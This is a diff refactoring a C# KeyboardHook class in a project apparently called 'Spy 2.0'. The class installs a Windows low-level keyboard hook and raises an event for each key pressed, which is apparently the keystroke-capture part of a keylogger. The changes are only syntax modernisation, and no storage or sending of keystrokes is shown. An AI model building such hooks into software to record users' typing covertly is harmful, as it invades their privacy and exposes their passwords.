@@ -11,7 +11,6 @@ namespace Spy_2._0.Hooks
         private const int WM_KEYDOWN = 0x0100;
         private LowLevelKeyboardProc _proc;
         private IntPtr _hookID = IntPtr.Zero;
-
         public delegate void KeyPressedHandler(string key);
         public event KeyPressedHandler KeyPressed;
 
@@ -21,18 +20,13 @@ namespace Spy_2._0.Hooks
             _hookID = SetHook(_proc);
         }
 
-        ~KeyboardHook()
-        {
-            UnhookWindowsHookEx(_hookID);
-        }
+        ~KeyboardHook() => UnhookWindowsHookEx(_hookID);
 
         private IntPtr SetHook(LowLevelKeyboardProc proc)
         {
-            using (Process curProcess = Process.GetCurrentProcess())
-            using (ProcessModule curModule = curProcess.MainModule)
-            {
-                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
-            }
+            using Process curProcess = Process.GetCurrentProcess();
+            using ProcessModule curModule = curProcess.MainModule;
+            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
         }
 
         private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
@@ -62,4 +56,3 @@ namespace Spy_2._0.Hooks
         private static extern IntPtr GetModuleHandle(string lpModuleName);
     }
 }
-
